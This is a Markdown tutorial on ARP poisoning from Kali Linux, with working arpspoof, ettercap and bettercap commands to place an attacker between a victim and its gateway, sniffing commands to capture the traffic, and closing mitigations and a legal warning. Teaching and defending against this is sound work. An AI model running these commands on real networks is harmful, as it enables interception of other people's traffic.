### Objective

Understand and perform ARP poisoning (a.k.a. ARP spoofing) using various tools on Kali Linux. ARP poisoning involves sending forged ARP messages to a LAN to associate the attacker’s MAC address with the IP address of another host, typically the gateway, to intercept traffic.

---

### Table of Contents

1. What is ARP Poisoning?
2. Prerequisites
3. ARP Poisoning with `arpspoof`
4. ARP Poisoning with `ettercap`
5. ARP Poisoning with `bettercap`
6. Packet Sniffing with `wireshark` or `tcpdump`
7. Mitigation Techniques

---

## 1. What is ARP Poisoning?

ARP (Address Resolution Protocol) is used to resolve IP addresses to MAC addresses in a local network. Since ARP lacks authentication, an attacker can send fake ARP responses and redirect traffic through their machine.

---

## 2. Prerequisites

- Two or more devices on the same LAN (attacker, victim, router)
- Kali Linux as attacker
- Root privileges
- Tools: arpspoof, ettercap, bettercap, tcpdump/wireshark

Enable IP forwarding:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

This allows the attacker's device to route traffic between the victim and the gateway.

---

## 3. ARP Poisoning with `arpspoof`

### Step 1: Discover IPs and MACs

Use `arp-scan` or `nmap` to identify target IPs.

```bash
arp-scan --interface=eth0 --localnet
```

### Step 2: ARP Spoofing Command

```bash
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

Explanation:
- `-i eth0`: Network interface.
- `-t 192.168.1.10`: Target IP (victim).
- `192.168.1.1`: Gateway IP.

Spoof the router too (optional but recommended):

```bash
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

Now, the victim and gateway think the attacker is the other.

---

## 4. ARP Poisoning with `ettercap`

`ettercap` is a powerful tool for ARP poisoning and MITM attacks.

### GUI Method:

```bash
ettercap -G
```

- Select sniff → unified sniffing → choose interface
- Targets → current hosts → scan for hosts
- Add victim and router to target 1 and 2
- MITM → ARP poisoning
- Start sniffing

### CLI Method:

```bash
ettercap -T -q -i eth0 -M arp:remote /192.168.1.10/ /192.168.1.1/
```

- `-T`: Text mode
- `-M arp:remote`: Remote ARP poisoning
- `/victim ip/ /gateway ip/`: Targets

---

## 5. ARP Poisoning with `bettercap`

Bettercap provides interactive and scriptable network attacks.

### Start Bettercap:

```bash
sudo bettercap -iface eth0
```

### In the interactive session:

```bash
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on
```

Explanation:
- `net.probe on`: Scan the network.
- `arp.spoof.targets`: Set the victim IP.
- `arp.spoof on`: Enable ARP spoofing.

You can also enable `net.sniff` to capture traffic:

```bash
net.sniff on
```

---

## 6. Packet Sniffing Tools

### Wireshark:

Start Wireshark and filter with:

```
ip.addr == 192.168.1.10
```

### tcpdump:

```bash
tcpdump -i eth0 host 192.168.1.10
```

---

## 7. Mitigation Techniques

- Use static ARP entries.
- Enable dynamic ARP inspection (DAI) on managed switches.
- Use encrypted protocols (HTTPS, SSH).
- Monitor ARP tables and detect anomalies.
- Use IDS tools like ARPWatch, XArp, Suricata.

---

## Summary Table

| Tool       | Mode        | CLI/GUI | Supports Sniffing | Notes                         |
|------------|-------------|---------|-------------------|-------------------------------|
| arpspoof   | ARP poison  | CLI     | No                | Lightweight and easy to use   |
| ettercap   | MITM suite  | Both    | Yes               | Supports filters and plugins  |
| bettercap  | MITM suite  | CLI     | Yes               | Modular and extensible        |

---

## Legal Warning

Use ARP poisoning only in authorized lab environments or penetration testing scenarios with proper permissions.

ARP poisoning is an effective MITM technique but also easily detectable with proper monitoring tools.
